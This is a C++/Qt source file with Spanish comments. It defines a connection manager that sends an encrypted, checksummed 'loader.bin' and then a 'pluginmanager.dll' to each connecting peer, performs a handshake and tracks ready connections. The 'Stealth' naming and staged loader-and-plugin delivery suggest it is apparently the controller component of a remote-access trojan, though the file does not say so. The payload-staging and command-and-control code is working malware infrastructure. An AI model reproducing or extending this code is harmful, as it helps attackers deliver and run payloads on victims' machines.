#include "connectionmanager.h"

ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage,QObject* parent) : QObject(parent)
{
    this->mngMessage=mngMessage;
    this->stealth=stealth;
    this->connectionIndex=0;

    connect(this,SIGNAL(connectionReady(Connection*)),this,SLOT(addConnection(Connection*)));
    connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
    connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
    connect(mngMessage,SIGNAL(receivedHandshakeOk(Connection*)),this,SLOT(checkHandshakeOk(Connection*)));
}

void ConnectionManager::sendLoader(Connection *connection)
{
    if(connection->getState()==Connection::JustConnected)
    {
        qDebug()<<"Enviando \"loader.bin\"";

        connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
        connect(connection,SIGNAL(timeout()),this,SLOT(connection_timeout()));
        connect(connection,SIGNAL(disconnected()),this,SLOT(connection_disconnected()));
        //TODO: Hacer que funcione
        //connect(connection,SIGNAL(error(QAbstractSocket::SocketError)),this,SLOT(connectionError(QAbstractSocket::SocketError)));

        /* Leemos el loader */
        QFile fileLoader("loader.bin");
        //QFile fileLoader(":/res/loader.bin");
        if(!fileLoader.open(QIODevice::ReadOnly))
        {
            qCritical()<<"No encontrado loader.bin";
            return;
        }
        QByteArray Loader=fileLoader.readAll();
        fileLoader.close();

        /* Añadimos padding PKCS7 */
        char pad=16-((Loader.size()+4)%16);
        for(int i=0;i<pad;i++)
        {
            Loader.append(pad);
        }

        /* Calculamos el checksum y lo insertamos al principio del mensaje */
        QByteArray checkSum=Crypto::FNV1a(Loader);
        Loader.insert(0,checkSum);

        /* Encriptamos el mensaje */
        QByteArray crypted=connection->crypt(Loader,false);

        /* Enviamos el mensaje: (IV+crypt(CheckSum+Loader)) */
        connection->write(connection->getIV()+crypted);

        qDebug()<<"\"loader.bin\" enviado";

        connection->setState(Connection::WaitingForLoader);
    }
}

void ConnectionManager::sendPluginManager(Connection *connection)
{
    qDebug()<<"Enviando \"pluginmanager.dll\"";

    /* Leemos el pluginmanager */
    QFile filePluginLoader("pluginmanager.dll");
    if(!filePluginLoader.open(QIODevice::ReadOnly))
    {
        qCritical()<<"No encontrado pluginmanager.dll";
        return;
    }
    QByteArray pluginLoader=filePluginLoader.readAll();
    filePluginLoader.close();

    /* Añadimos padding PKCS7 */
    char pad=16-((pluginLoader.size()+4)%16);
    for(int i=0;i<pad;i++)
    {
        pluginLoader.append(pad);
    }

    /* Calculamos el CheckSum y lo insertamos al principio del mensaje */
    QByteArray checkSum=Crypto::FNV1a(pluginLoader);
    pluginLoader.insert(0,checkSum);

    /* Encriptamos el mensaje */
    QByteArray crypted=connection->crypt(pluginLoader,false);

    /* Insertamos el tamaño del pluginmanager al principio del mensaje */
    quint32 pluginManagerSize=pluginLoader.size();
    crypted.insert(0,(char*)&pluginManagerSize,4);

    /* Enviamos el mensaje: (TamañoPluginmanager+crypt(CheckSum+Pluginmanager))  */
    connection->write(crypted);

    qDebug()<<"\"pluginmanager.dll\" enviado";

    connection->setState(Connection::WaitingForGreeting);
}

void ConnectionManager::processHandshake(Connection* connection)
{
    qDebug()<<"Procesando Handshake";

    /* Guardamos el handshake */
    connection->HandShake=(Connection::RPEP_SERVER_HANDSHAKE*)malloc(sizeof(Connection::RPEP_SERVER_HANDSHAKE));
    memcpy(connection->HandShake,connection->Data.data(),sizeof(Connection::RPEP_SERVER_HANDSHAKE));

    /* Nos aseguramos de que el tamaño máximo cumple con un mínimo */
    if(connection->HandShake->MaxBlockSize<0x400)
    {
        qWarning("ClientHandShake.MaxBlockSize inválido");
        return;
    }

    qDebug()<<"Handshake aceptado";

    qDebug()<<"Construyendo handshake de respuesta";

    #define NUM_PORTS 0

    /* Construímos el Handshake que enviaremos al servidor */
    Connection::RPEP_CLIENT_HANDSHAKE* clientHandshake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);
    clientHandshake->CompressionALGM=0;
    clientHandshake->MaxBlockSize=connection->HandShake->MaxBlockSize;
    //ClientHandShake->Port[0]=11155;
    clientHandshake->PortCount=NUM_PORTS;
    clientHandshake->Version.High=1;
    clientHandshake->Version.Low=0;

    /* Enviamos el handshake */
    connection->sendClientHandshake(clientHandshake);

    free(clientHandshake);

    qDebug()<<"Handshake enviado";

    qDebug()<<"Esperando confirmación de HandShake";

    connection->setState(Connection::WaitingGreetingOk);
}

void ConnectionManager::checkHandshakeOk(Connection* connection)
{
    qDebug()<<"Comprobando confirmación de handshake";

    /* Obtenemos el mensaje de error */
    Connection::RPEP_ERROR ok=*(Connection::RPEP_ERROR*)connection->Data.data();

    /* Si no es 0 ni 0xFFFF es un mensaje equivocado */
    if(ok.Code!=0 && ok.Code!=0xFFFF)
    {
        qWarning("Confirmacion de Handshake invalida");
        return;
    }
    /* Si es 0xFFFF, el server no soporta el handshake enviado */
    //TODO: Ver que hacer en este caso
    else if(ok.Code==0xFFFF)
    {
        qWarning()<<"Confirmación de Handshake errónea, el pluginmanager no soporta el handshake enviado";
        return;
    }

    qDebug()<<"Confirmación handshake correcta";

    /* Asignamos un ID a la conexión */
    connection->setID(connectionIndex++);

    qDebug()<<"Conexión #"+QString::number(connection->getID())+" lista";

    /* Informamos de que la conexión ya esta lista para ser usada */
    connection->setState(Connection::Ready);
    emit connectionReady(connection);
}

void ConnectionManager::addConnection(Connection* connection)
{
    Connections.append(connection);
}

Connection* ConnectionManager::connection(int ID)
{
    /* Buscamos la conexión con el ID indicado y la retornamos */
    foreach(Connection* cn,Connections)
    {
        if(cn->getID()==ID) return cn;
    }

    return 0;
}

void ConnectionManager::connection_timeout()
{
    /* Desconectamos la conexión */
    Connection* connection=qobject_cast<Connection*>(sender());

    qWarning()<<"Conexión #"+QString::number(connection->getID())+" ausente";

    connection->disconnectFromHost();
}

void ConnectionManager::connectionError(QAbstractSocket::SocketError)
{
    /* Desconectamos la conexión */
    Connection* connection=qobject_cast<Connection*>(sender());

    qWarning()<<"Error en conexión #"+QString::number(connection->getID());

    connection->disconnectFromHost();
}

void ConnectionManager::connection_disconnected()
{
    /* Informamos de que la conexión será eliminada y la eliminamos */
    Connection* connection=qobject_cast<Connection*>(sender());

    qWarning()<<"Conexión #"+QString::number(connection->getID())+" perdida";

    if(connection->getState()>=Connection::Ready)
    {
        emit connectionDeleted(connection->getID());
    }

    connection->deleteLater();
}
